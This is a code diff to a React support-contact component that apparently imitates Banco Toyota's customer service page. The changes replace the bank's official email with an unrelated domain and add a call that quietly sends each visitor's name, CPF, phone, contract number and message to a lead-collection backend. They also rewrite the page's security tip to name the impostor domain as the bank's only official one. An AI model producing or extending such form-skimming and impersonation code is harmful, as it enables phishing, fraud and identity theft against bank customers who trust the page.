@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { Mail, ShieldCheck, CheckCircle2, HelpCircle, Phone, Clock, Info, ArrowRight, FileText } from 'lucide-react';
+import { submitLead } from '../lib/leads';
 
 export default function EmailTab() {
   const [nome, setNome] = useState('');
@@ -43,9 +44,22 @@ export default function EmailTab() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    
+
+    // Register lead in backend API
+    submitLead({
+      nome,
+      email,
+      cpf,
+      telefone,
+      assunto,
+      mensagem,
+      contrato,
+      originDomain: 'https://www.centraldeapoio.com',
+      targetEmail: 'suporte@centraldeapoio.com',
+    });
+
     // Prepare the mailto parameters
-    const recipient = 'atendimento@bancotoyota.com.br';
+    const recipient = 'suporte@centraldeapoio.com';
     const emailSubject = `Solicitação de Atendimento - ${assunto}`;
     const emailBody = `Olá, gostaria de solicitar atendimento para:
 - Serviço: ${assunto}
@@ -62,7 +76,7 @@ Atenciosamente,
 ${nome}`;
 
     const mailtoUrl = `mailto:${recipient}?subject=${encodeURIComponent(emailSubject)}&body=${encodeURIComponent(emailBody)}`;
-    
+
     // Trigger mail client redirect
     window.location.href = mailtoUrl;
     setSubmitted(true);
@@ -130,10 +144,10 @@ ${nome}`;
             <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 space-y-1 text-center">
               <span className="text-[10px] text-slate-400 font-bold uppercase tracking-wider block">Endereço de E-mail Direto</span>
               <a 
-                href="mailto:atendimento@bancotoyota.com.br"
+                href="mailto:suporte@centraldeapoio.com"
                 className="text-sm font-extrabold text-red-600 hover:underline font-mono"
               >
-                atendimento@bancotoyota.com.br
+                suporte@centraldeapoio.com
               </a>
             </div>
           </div>
@@ -144,7 +158,7 @@ ${nome}`;
             <div className="space-y-1">
               <h4 className="font-bold text-xs text-red-900">Dica de Segurança</h4>
               <p className="text-[11px] text-red-700 leading-relaxed">
-                Nossos e-mails oficiais terminam exclusivamente com o domínio <strong className="text-red-900">@bancotoyota.com.br</strong>. Desconfie de qualquer remetente usando provedores genéricos (como @gmail.com ou @outlook.com).
+                Nossos e-mails oficiais terminam exclusivamente com o domínio <strong className="text-red-900">@centraldeapoio.com</strong>. Desconfie de qualquer remetente usando provedores genéricos (como @gmail.com ou @outlook.com).
               </p>
             </div>
           </div>
@@ -160,7 +174,7 @@ ${nome}`;
               <div className="space-y-2">
                 <h3 className="text-xl font-bold text-gray-900">Solicitação Iniciada!</h3>
                 <p className="text-xs text-slate-500 leading-relaxed">
-                  O seu cliente de e-mail foi aberto com os dados preenchidos. Caso não tenha aberto automaticamente, você pode enviar um e-mail para <strong className="text-slate-800">atendimento@bancotoyota.com.br</strong> com as seguintes informações:
+                  O seu cliente de e-mail foi aberto com os dados preenchidos. Caso não tenha aberto automaticamente, você pode enviar um e-mail para <strong className="text-slate-800">suporte@centraldeapoio.com</strong> com as seguintes informações:
                 </p>
               </div>
 
@@ -168,7 +182,7 @@ ${nome}`;
               <div className="bg-slate-50/50 rounded-xl border border-slate-100 p-5 text-left space-y-3">
                 <div className="flex justify-between border-b border-slate-100 pb-2 text-[11px]">
                   <span className="text-slate-400 font-bold">Destinatário:</span>
-                  <span className="text-slate-700 font-mono font-bold">atendimento@bancotoyota.com.br</span>
+                  <span className="text-slate-700 font-mono font-bold">suporte@centraldeapoio.com</span>
                 </div>
                 <div className="flex justify-between border-b border-slate-100 pb-2 text-[11px]">
                   <span className="text-slate-400 font-bold">Assunto:</span>
